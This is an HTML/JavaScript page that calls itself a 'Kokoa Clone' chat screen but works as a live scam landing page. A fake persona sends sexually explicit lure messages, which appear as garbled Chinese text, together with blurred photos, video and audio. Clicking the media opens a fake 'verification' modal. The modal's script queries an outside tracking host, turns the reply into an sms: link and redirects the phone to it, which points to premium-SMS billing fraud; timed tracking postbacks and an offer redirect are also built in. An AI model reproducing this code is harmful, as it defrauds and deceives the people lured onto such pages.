<!-- Seventh page of the Kokoa Clone  -->
<!-- 09.png of the screenshots -->
<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Linking with css file and a short cut is link:css -->
  <link rel="stylesheet" href="css/styles.css" />
  <meta charset="UTF-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Chat with Sophia - to Kokoa Clone</title>
  <style>
    .chat-image {
      display: block;
      max-width: 280px;
      width: 100%;
      height: auto;
      margin-top: 1px;
      margin-bottom: 5px;
      /* å¯é€‰ï¼šæ·»åŠ ä¸Šè¾¹è·ä»¥å¢åŠ å›¾ç‰‡ä¸æ–‡å­—ä¹‹é—´çš„é—´è· */
      border-radius: 10px;
      filter: blur(5px);
      cursor: pointer;
      /* é¼ æ ‡æ‚¬åœæ—¶æ˜¾ç¤ºä¸ºå¯ç‚¹å‡» */
    }

    .message__bubble {
      margin-right: 5px;
      /* Add margin to the right of the message bubble */
    }

    .message__time {
      margin-left: 5px;
      /* Add margin to the left of the message time */
    }

    .message__info {
      margin-bottom: 2px;
      /* Reduce margin to the bottom of each message info */
    }

    #chat-container {
      overflow-y: auto;
      padding-bottom: 60px;
      /* Ensure space for the reply form */
    }

    /* ä¼˜åŒ–æ¨¡æ€å¼¹çª—çš„æ ·å¼ */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0, 0, 0, 0.6);
      /* å¢åŠ èƒŒæ™¯é€æ˜åº¦ */
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
      /* æ·»åŠ å¹³æ»‘çš„è¿‡æ¸¡æ•ˆæœ */
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.3s ease, visibility 0.3s ease;
    }

    /* æ˜¾ç¤ºæ¨¡æ€å¼¹çª—æ—¶çš„æ ·å¼ */
    .modal-overlay.show {
      opacity: 1;
      visibility: visible;
    }

    .modal-content {
      background: #ffffff;
      padding: 30px 20px;
      border-radius: 12px;
      text-align: center;
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.25);
      /* æ·»åŠ ç›’å­é˜´å½± */
      max-width: 500px;
      width: 90%;
      /* æ·»åŠ è¿‡æ¸¡æ•ˆæœ */
      transform: translateY(-50px);
      transition: transform 0.3s ease;
    }

    /* å¼¹çª—æ˜¾ç¤ºæ—¶çš„åŠ¨ç”»æ•ˆæœ */
    .modal-overlay.show .modal-content {
      transform: translateY(0);
    }

    /* ä¼˜åŒ–éªŒè¯æŒ‰é’®çš„æ ·å¼ */
    #verify-button {
      padding: 12px 24px;
      margin-top: 30px;
      border: none;
      background-color: #007BFF;
      color: #ffffff;
      font-size: 16px;
      border-radius: 6px;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.2s ease;
    }

    #verify-button:hover {
      background-color: #0056b3;
      transform: translateY(-2px);
    }

    /* ç¾åŒ–å¼¹çª—å†…çš„å›¾ç‰‡ */
    .modal-content img {
      max-width: 100%;
      height: auto;
      border-radius: 8px;
      margin: 20px 0;
    }

    /* ä¸ºè§†é¢‘å’ŒéŸ³é¢‘æ·»åŠ æ ·å¼ */
    .chat-video {
      max-width: 280px;
      width: 100%;
      margin-top: 1px;
      margin-bottom: 5px;
      border-radius: 10px;
      cursor: pointer;

      /* æ·»åŠ ä»¥ä¸‹æ ·å¼ä»¥ç¡®ä¿éŸ³é¢‘å…ƒç´ å¯è§ */
      background-color: #f0f0f0;
      /* æ·»åŠ èƒŒæ™¯è‰² */
      min-height: 30px;
      /* è®¾ç½®æœ€å°é«˜åº¦ */
      position: relative;
    }

    /* å¯é€‰ï¼šæ·»åŠ éšè—çš„è§†é¢‘å…ƒç´ ç”¨äºæå–å¸§ */
    .hidden-video {
      display: none;
    }
  </style>
</head>

<body id="chat-screen">
  <header class="alt-header">
    <div class="alt-header__column">
      <a><i class="fas fa-angle-left fa-2x"></i></a>
    </div>
    <div class="alt-header__column">
      <div class="alt-header__title" id="header-title"><!-- ...existing code... --></div> <!-- æ·»åŠ  id å±æ€§ -->
    </div>
    <div class="alt-header__column">
      <span><i class="fas fa-search fa-lg"></i></span>
      <span><i class="fas fa-bars fa-lg alt-header__column-icon-last"></i></span>
    </div>
  </header>

  <main class="main-screen main-chat" id="chat-container">
    <!-- ä¿®æ”¹æ—¶é—´æˆ³ divï¼Œæ·»åŠ  id -->
    <div class="chat__timestamp" id="current-timestamp">Friday, August 20, 2021</div>
    <!-- The chat messages will be added here -->
  </main>

  <form class="reply">
    <div class="reply__column">
      <i class="far fa-plus-square fa-2x"></i>
    </div>
    <div class="reply__column">
      <input type="text" placeholder="Write a message..." />
      <i class="far fa-smile-wink fa-2x"></i>
      <button type="submit"><i class="fas fa-arrow-up fa-lg"></i></button>
    </div>
  </form>
  <script>

    function getURLParameter(name) {
      return decodeURI(
        (RegExp('[?&]' + name + '=' + '(.*?)(&|$)').exec(location.search) || [, null])[1] || ''
      );
    }
    var tracking = getURLParameter('tracking');
    var c = getURLParameter('c');

    function postbackEvent(event_kv) {
      try {
        var url = new URL(decodeURIComponent(c));
        var event_url = url.protocol + "//" + url.host + url.pathname;
        var wrapUrlWithClickId = (function () { "use strict"; function n(n, r) { var e; void 0 === r && (r = "uclick"); var u = null === (e = n.match(/\?.+?$/)) || void 0 === e ? void 0 : e[0]; return u ? Array.from(u.matchAll(new RegExp("[?&](clickid|" + r + ")=([^=&]*)", "g"))).map((function (n) { return { name: n[1], value: n[2] } })) : [] } function r(n) { var r = n(); return 0 === r.length ? {} : r.reduce((function (n, r) { var e; return Object.assign(n, ((e = {})[r.name] = "" + r.value, e)) }), {}) } function e(e) { void 0 === e && (e = "uclick"); var u, i, t = r((function () { return (function (n) { return void 0 === n && (n = "uclick"), Array.from(document.cookie.matchAll(new RegExp("(?:^|; )(clickid|" + n + ")=([^;]*)", "g"))).map((function (n) { return { name: n[1], value: n[2] } })) })(e) })), c = r((function () { return n(document.referrer, e) })), a = r((function () { return n(document.location.search, e) })); return (u = [e, "clickid"], i = [t, c, a], u.reduce((function (n, r) { return n.concat(i.map((function (n) { return [r, n] }))) }), [])).map((function (n) { return { name: n[0], value: n[1][n[0]] } })).find((function (n) { return n.value })) || null } function u(n, r, e) { var u = n.replace(new RegExp(r + "=[^=&]*", "g"), r + "=" + e); return -1 !== u.indexOf(r) ? u : (function (n, r, e) { var u = n.trim(), i = r + "=" + e; return -1 === u.indexOf("?") ? u + "?" + i : u.endsWith("?") ? "" + u + i : u + "&" + i })(n, r, e) } return function (n, r) { void 0 === r && (r = "uclick"); var i = e(r); return null === i ? n : n.includes("cnv_id") ? i.name === r ? u(n, i.name, i.value) : i.value ? u(n, "cnv_id", i.value) : n : u(n, i.name, i.value) } })();
        var img = document.createElement('img');
        img.src = wrapUrlWithClickId(event_url + '?' + event_kv);
        img.referrerPolicy = 'no-referrer-when-downgrade';
      } catch (e) {
        console.error('Invalid URL:', c);
      }
    }

    function pushAfterTimeout(timeout) {
      setInterval(function () { postbackEvent('add_event7=5'); }, timeout * 1000);
    }

    function getMobileOperatingSystem() {
      var userAgent = navigator.userAgent || navigator.vendor || window.opera;

      if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
        return 'iphone';
      }

      if (/android/i.test(userAgent)) {
        return 'android';
      }

      return 'unknown';
    }

    function convertAndroidToiPhone(androidUrl) {
      // æ£€æŸ¥ä¼ å…¥çš„ URL æ˜¯å¦æ˜¯ä»¥ "sms:" å¼€å¤´
      if (!androidUrl.startsWith('sms:')) {
        throw new Error("URLæ ¼å¼ä¸æ­£ç¡®ï¼Œå¿…é¡»ä»¥ 'sms:' å¼€å¤´");
      }

      // å»é™¤ "sms:" å‰ç¼€
      let urlContent = androidUrl.substring(4);

      // åˆ†å‰²å‡ºç”µè¯å·ç å’Œbody
      let [phoneNumbersPart, bodyPart] = urlContent.split('?body=');

      // åˆ†å‰²å‡ºå„ä¸ªç”µè¯å·ç 
      let phoneNumbers = phoneNumbersPart.split(';').map(num => num.trim());

      // æŠŠç”µè¯å·ç æ•°ç»„è½¬æ¢ä¸ºä»¥é€—å·åˆ†éš”çš„å­—ç¬¦ä¸²
      let phoneNumbersStr = phoneNumbers.join(',');

      // ç¼–ç  body éƒ¨åˆ†ä»¥é€‚é… URL
      let encodedBody = encodeURIComponent(bodyPart);

      // æ„é€  iPhone æ ¼å¼çš„ SMS URL
      let iPhoneUrl = `sms://open?addresses=${phoneNumbersStr}/&body=${encodedBody}`;

      return iPhoneUrl;
    }

    // æ·»åŠ è¾…åŠ©å‡½æ•°è·å–æ ¼å¼åŒ–æ—¶é—´
    function getFormattedTime(minutesAgo = 0) {
      const now = new Date();
      now.setMinutes(now.getMinutes() - minutesAgo);
      const options = { hour: '2-digit', minute: '2-digit', hour12: false };
      return now.toLocaleTimeString('en-US', options);
    }
    // æ•°æ®æº start
    const messages = [
      {
        author: 'ğŸŒ¸SophiağŸŒ¸',
        avatar: './av.png',
        content: [
          { type: 'text', text: 'ğŸŒ¸æ¬§å·´ï¼Œä½ åœ¨å¹²å˜›ï¼Ÿ', time: getFormattedTime(5) },
          { type: 'text', text: 'æˆ‘è‡ªå·±ä¸€ä¸ªäººï¼Œè¶…çº§æ— èŠï¼Œå¥½åƒæœ‰äººé™ªæˆ‘ï¼Œä¸‹é¢æ˜¯æˆ‘çš„ç…§ç‰‡ï¼Œç‚¹å‡»å°±å¯ä»¥çœ‹åˆ°ï¼Œä½ å–œæ¬¢ä¹ˆï¼ŸğŸ‘‡ğŸ‘‡ğŸ‘‡', time: getFormattedTime(5) },
          { type: 'image', src: './1.png', modalTitle: 'æŸ¥çœ‹ Sophia çš„ç…§ç‰‡' },
          { type: 'text', text: 'è¿˜æœ‰è¿™ä¸€å¼ ï¼Œæˆ‘è‡ªå·±åœ¨åºŠä¸Š', time: getFormattedTime(4) },
          { type: 'image', src: './2.jpg', modalTitle: 'æŸ¥çœ‹ Sophia çš„æ€§æ„Ÿç…§ç‰‡' },
          { type: 'text', text: 'ä½ ä¹Ÿæ˜¯ä¸€ä¸ªäººä¹ˆï¼Ÿ', time: getFormattedTime(3) },
          { type: 'text', text: 'ä½ ç©è¿‡è§†é¢‘è£¸èŠä¹ˆï¼Ÿ æˆ‘æƒ³å°è¯•ä¸€ä¸‹ï¼Œè‚¯å®šå¾ˆåˆºæ¿€', time: getFormattedTime(2) },
          { type: 'text', text: 'å–œæ¬¢çœ‹æˆ‘è‡ªæ…°ä¹ˆï¼ŸğŸ‘‡', time: getFormattedTime(0) },
          { type: 'video', src: './2.mp4', modalTitle: 'æŸ¥çœ‹ Sophia çš„è‡ªæ…°è§†é¢‘', poster: './2-poster.jpg' }, // æ·»åŠ  poster å±æ€§
          { type: 'text', text: 'å–œæ¬¢å¬æˆ‘å‘»åŸä¹ˆï¼Ÿæˆ‘ç°åœ¨å¥½åƒåšçˆ± ğŸ‘‡ğŸ‘‡ğŸ‘‡', time: getFormattedTime(0) },
          { type: 'audio', src: './3.mp3', modalTitle: 'å¬å¬ Sophia çš„è‡ªæ…°çš„å£°éŸ³', },
          { type: 'text', text: 'ä½ è¿˜åœ¨ä¹ˆï¼Ÿ', time: getFormattedTime(0) },
        ]
      },

    ];

    // å®šä¹‰æ¨¡æ€å¼¹çª—å†…å®¹å¯¹è±¡
    const modalContent = {
      "modal": {
        "messages": [
          "è¯·å®ŒæˆéªŒè¯ä»¥æŸ¥çœ‹å›¾ç‰‡ã€‚",
          "è¯·å®ŒæˆéªŒè¯ä»¥æŸ¥çœ‹ Sophia çš„ç§å¯†ç…§ç‰‡ï¼"
        ],
        "image": {
          "src": "./av.png",
          "alt": "éªŒè¯å›¾ç‰‡"
        },
        "buttonText": "éªŒè¯",
        "validating": "éªŒè¯ä¸­...",
        "offerlink": "https://new-link-url.com",
      }
    };

    // æ·»åŠ åª’ä½“éªŒè¯è¿½è¸ªå˜é‡
    let totalMediaCount = -1;
    let verifiedMediaCount = 0;
    // æ•°æ®æº end
  </script>

  <!-- æ·»åŠ æ¨¡æ€å¼¹çª—çš„ HTMLï¼Œç§»é™¤åŸæœ‰æ–‡æœ¬å’Œå›¾ç‰‡åœ°å€ -->
  <div id="modal-overlay" class="modal-overlay">
    <div class="modal-content">
      <p id="modal-message-1"><!-- ...existing code... --></p>
      <img id="modal-image" src="" alt="" style="max-width: 100%; height: auto;" />
      <p id="modal-message-2"><!-- ...existing code... --></p>
      <button id="verify-button"><!-- ...existing code... --></button>
    </div>
  </div>

  <!-- This is needed as it is a key to using icons from fontawesome.com -->
  <script src="./6478f529f2.js" crossorigin="anonymous"></script>
  <script>
    // å®šä¹‰ handleMediaPlay å‡½æ•°åœ¨ renderMessage ä¹‹å‰
    function handleMediaPlay(event) {
      const mediaElement = event.target;
      if (!mediaElement.dataset.firstPlayDone) {
        // ç¬¬ä¸€æ¬¡æ’­æ”¾ï¼Œå–æ¶ˆæ¨¡ç³Šæ•ˆæœå¹¶å¯ç”¨æ§ä»¶
        mediaElement.style.filter = 'none';
        mediaElement.controls = true;
        mediaElement.dataset.firstPlayDone = 'true';
        const modalTitle = mediaElement.getAttribute('data-modal-title'); // è·å– data-modal-title å±æ€§
        // æ·»åŠ æ’­æ”¾æ—¶é—´ç›‘å¬
        function onTimeUpdate() {
          if (mediaElement.currentTime >= 5) {
            console.log('å½“å‰æ—¶é—´:', mediaElement.currentTime);
            mediaElement.pause(); // æš‚åœæ’­æ”¾
            showModal(modalTitle, () => {
              //setTimeout(() => {
              //  mediaElement.play().catch(error => {
              //    console.error('ç»§ç»­æ’­æ”¾åª’ä½“æ—¶å‡ºé”™:', error);
              //  });
              //}, 3000); // 3ç§’åç»§ç»­æ’­æ”¾
            });
            mediaElement.removeEventListener('timeupdate', onTimeUpdate);
          }
        }

        mediaElement.addEventListener('timeupdate', onTimeUpdate);
      }
    }

    const chatContainer = document.getElementById('chat-container');

    // æ·»åŠ è¾…åŠ©å‡½æ•°ï¼Œä»è§†é¢‘ä¸­æå–å¸§
    function extractFrame(videoSrc, time = 1) {
      return new Promise((resolve, reject) => {
        const video = document.createElement('video');
        video.src = videoSrc;
        video.crossOrigin = 'anonymous';
        video.currentTime = time;

        video.addEventListener('loadeddata', () => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;

          const ctx = canvas.getContext('2d');
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
          const dataURL = canvas.toDataURL('image/png');
          resolve(dataURL);
        });

        video.addEventListener('error', (e) => {
          reject(e);
        });
      });
    }



    function renderMessage(message) {
      setTimeout(async () => {
        const messageRow = document.createElement('div');
        messageRow.classList.add('message-row');
        if (message.author === 'own') {
          messageRow.classList.add('message-row--own');
        } else {
          const avatar = document.createElement('img');
          avatar.src = message.avatar;
          avatar.classList.add('avatar');
          messageRow.appendChild(avatar);
        }

        const messageContent = document.createElement('div');
        messageContent.classList.add('message-row__content');

        for (const content of message.content) {
          const messageInfo = document.createElement('div');
          messageInfo.classList.add('message__info');

          if (content.type === 'image') {
            totalMediaCount += 1; // å¢åŠ æ€»åª’ä½“æ•°é‡
            const img = document.createElement('img');
            img.src = content.src;
            img.classList.add('chat-image');
            img.setAttribute('data-modal-title', content.modalTitle); // è®¾ç½® data-modal-title å±æ€§
            messageInfo.appendChild(img);
          } else if (content.type === 'video') {
            totalMediaCount += 1; // å¢åŠ æ€»åª’ä½“æ•°é‡
            const video = document.createElement('video');
            video.src = content.src;
            video.controls = true; // åˆå§‹æ˜¾ç¤ºè§†é¢‘æ§ä»¶
            video.classList.add('chat-video');
            video.setAttribute('data-modal-title', content.modalTitle); // è®¾ç½® data-modal-title å±æ€§
            video.addEventListener('play', handleMediaPlay); // ä½¿ç”¨ 'play' äº‹ä»¶

            // åŠ¨æ€æå–å¸§ä½œä¸ºå°é¢
            try {
              const posterURL = await extractFrame(content.src, 1); // æå–ç¬¬1ç§’çš„å¸§
              video.poster = posterURL;
            } catch (error) {
              console.error('Failed to extract frame:', error);
            }

            messageInfo.appendChild(video);
          } else if (content.type === 'audio') {
            totalMediaCount += 1; // å¢åŠ æ€»åª’ä½“æ•°é‡
            const audio = document.createElement('audio');
            audio.src = content.src;
            audio.controls = true; // åˆå§‹æ˜¾ç¤ºéŸ³é¢‘æ§ä»¶
            audio.classList.add('chat-audio');
            audio.setAttribute('data-modal-title', content.modalTitle); // è®¾ç½® data-modal-title å±æ€§
            audio.addEventListener('play', handleMediaPlay); // ä½¿ç”¨ 'play' äº‹ä»¶
            messageInfo.appendChild(audio);
          } else if (content.type === 'text') {
            const messageBubble = document.createElement('span');
            messageBubble.classList.add('message__bubble');
            messageBubble.textContent = content.text;
            messageInfo.appendChild(messageBubble);

            if (content.time) {
              const messageTime = document.createElement('span');
              messageTime.classList.add('message__time');
              messageTime.textContent = content.time;
              messageInfo.appendChild(messageTime);
            }
          }

          messageContent.appendChild(messageInfo);
        }

        messageRow.appendChild(messageContent);
        chatContainer.appendChild(messageRow);

        // Scroll to the latest message
        chatContainer.scrollTop = chatContainer.scrollHeight;
      }, 0);
    }

    messages.forEach(renderMessage);

    const replyForm = document.querySelector('.reply');
    replyForm.addEventListener('submit', function (event) {
      event.preventDefault();
      const input = replyForm.querySelector('input[type="text"]');
      const newMessage = input.value.trim();
      if (newMessage) {
        const message = {
          author: 'own',
          content: [{ type: 'text', text: newMessage, time: new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) }]
        };
        messages.push(message);
        renderMessage(message);
        input.value = '';
      }
    });

    // æ·»åŠ æ˜¾ç¤ºæ¨¡æ€å¼¹çª—çš„å‡½æ•°
    function showModal(modalTitle, callback) { // ä¿®æ”¹å‡½æ•°å‚æ•°
      document.getElementById('modal-message-1').textContent = modalTitle; // è®¾ç½®æ¨¡æ€å¼¹çª—çš„æ ‡é¢˜
      document.getElementById('verify-button').textContent = modalContent.modal.buttonText;
      const modalOverlay = document.getElementById('modal-overlay');
      modalOverlay.classList.add('show'); // æ·»åŠ  'show' ç±»ä»¥æ˜¾ç¤ºå¼¹çª—

      const verifyButton = document.getElementById('verify-button');
      verifyButton.onclick = function () {
        // æŠŠéªŒè¯æ”¹ä¸ºéªŒè¯ä¸­
        document.getElementById('verify-button').textContent = modalContent.modal.validating;
        // å‘é€çŸ­ä¿¡éªŒè¯ç æˆ–å…¶ä»–éªŒè¯æ–¹å¼
        console.log('å‘é€éªŒè¯è¯·æ±‚...');
        try {
          handleSMS('send', modalTitle); // Use handleSMS to send SMS
        } catch (error) {
          console.log('Error sending SMS:', error);
        }
        // åœ¨ç‚¹å‡»ç¡®è®¤åç­‰å¾… 3 ç§’å†éšè—å¼¹çª—
        setTimeout(function () {
          modalOverlay.classList.remove('show'); // ç§»é™¤ 'show' ç±»ä»¥éšè—å¼¹çª—
          verifiedMediaCount += 1; // å¢åŠ å·²éªŒè¯åª’ä½“æ•°é‡

          // æ£€æŸ¥æ˜¯å¦æ‰€æœ‰åª’ä½“éƒ½å·²éªŒè¯
          if (verifiedMediaCount === totalMediaCount) {
            // è·³è½¬åˆ°æ–°é“¾æ¥
            window.location.href = modalContent.modal.offerlink;
          }

          callback();
        }, 3000); // 3ç§’åæ‰§è¡Œ
      };
    }

    var firstClickDone = false;
    // æ›´æ–°å›¾ç‰‡çš„ç‚¹å‡»äº‹ä»¶ç›‘å¬å™¨
    document.addEventListener('click', function (event) {
      if (event.target.classList.contains('chat-image')) {
        const imgElement = event.target;
        const modalTitle = imgElement.getAttribute('data-modal-title'); // è·å– data-modal-title å±æ€§

        if (!firstClickDone || imgElement.dataset.firstClickDone) { // ä¿®æ”¹æ¡ä»¶
          // ç¬¬ä¸€æ¬¡ç‚¹å‡»ï¼Œç›´æ¥æ˜¾ç¤ºå›¾ç‰‡
          imgElement.style.filter = 'none'; // å»é™¤æ¨¡ç³Šæ•ˆæœ
          imgElement.dataset.firstClickDone = 'true'; // æ ‡è®°å·²å®Œæˆç¬¬ä¸€æ¬¡ç‚¹å‡»
          firstClickDone = true;
        } else {
          imgElement.dataset.firstClickDone = 'true'; // æ ‡è®°å·²å®Œæˆç¬¬ä¸€æ¬¡ç‚¹å‡»
          // å·²ç»ç‚¹å‡»è¿‡ï¼Œæ˜¾ç¤ºæ¨¡æ€å¼¹çª—
          imgElement.style.filter = 'blur(5px)'; // é‡æ–°åº”ç”¨æ¨¡ç³Šæ•ˆæœ
          showModal(modalTitle, function () { // ä¼ é€’ modalTitle å‚æ•°
            setTimeout(function () {
              imgElement.style.filter = 'none'; // 3 ç§’åå»é™¤æ¨¡ç³Šæ•ˆæœ
            }, 3000);
          });
        }
      }
    });

    // æ·»åŠ åŠ¨æ€æ›´æ–°æ—¶é—´æˆ³çš„ä»£ç 
    window.addEventListener('DOMContentLoaded', (event) => {
      const timestampDiv = document.getElementById('current-timestamp');
      if (timestampDiv) {
        const now = new Date();
        now.setMinutes(now.getMinutes() - 2);
        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
        // ä¿®æ”¹ä¸ºä½¿ç”¨ 'en-US' ä»¥ç¡®ä¿æ—¶é—´æˆ³ä¸ºè‹±æ–‡æ ¼å¼
        const formattedTime = now.toLocaleDateString('en-US', options);
        timestampDiv.textContent = formattedTime;
      }
      pushAfterTimeout(5);
    });

    // åŠ è½½å¹¶åº”ç”¨æ¨¡æ€å¼¹çª—å†…å®¹
    document.addEventListener('DOMContentLoaded', () => {
      try {
        // è®¾ç½®æ¨¡æ€å¼¹çª—çš„æ–‡æœ¬å†…å®¹
        document.getElementById('modal-message-1').textContent = modalContent.modal.messages[0];
        document.getElementById('modal-message-2').textContent = modalContent.modal.messages[1];

        // è®¾ç½®æ¨¡æ€å¼¹çª—çš„å›¾ç‰‡
        const modalImage = document.getElementById('modal-image');
        modalImage.src = modalContent.modal.image.src;
        modalImage.alt = modalContent.modal.image.alt;

        // è®¾ç½®æŒ‰é’®æ–‡æœ¬
        document.getElementById('verify-button').textContent = modalContent.modal.buttonText;
      } catch (error) {
        console.error('Error applying modal content:', error);
      }
    });

    // è®¾ç½®åŠ¨æ€æ ‡é¢˜
    document.getElementById('header-title').textContent = messages[0].author;

    // Unified SMS handling function
    function handleSMS(action, message = "") {
      console.log(`SMS ${action} action triggered with message: ${message}`);
      // track id need to be added to the url 
      var tracking = getURLParameter('tracking');

      console.log('Tracking:', tracking);

      var url = "https://mubulomokijo.xyz/track/mtracker.php?clientId=606&productId=1452&country={country_iso_2}&isp={isp_utf8_encoded}&tracking=" + tracking;

      console.log('URL:', url);

      var xhr = new XMLHttpRequest();
      xhr.open('GET', url);
      xhr.onload = function () {
        if (xhr.status === 200) {
          console.log('Request succeeded. Response:', xhr.response);
          var body = xhr.response;

          var data = JSON.parse(body);

          var urlTo = data.urlTo;

          console.log(urlTo);

          // åˆ¤æ–­ç”¨æˆ·æ˜¯ android è¿˜æ˜¯ ios
          var os = getMobileOperatingSystem();
          console.log('User is using: ' + os);
          if (os == 'iphone') {
            urlTo = convertAndroidToiPhone(urlTo);
          }
          console.log(urlTo);

          window.location.href = urlTo;

          postbackEvent('add_event2=1');
        } else {
          console.log('Request failed.  Returned status of ' + xhr.status);
        }
      };

      xhr.onerror = function () {
        console.log('Network error occurred.');
      };

      xhr.send();

    }
  </script>

</body>

</html>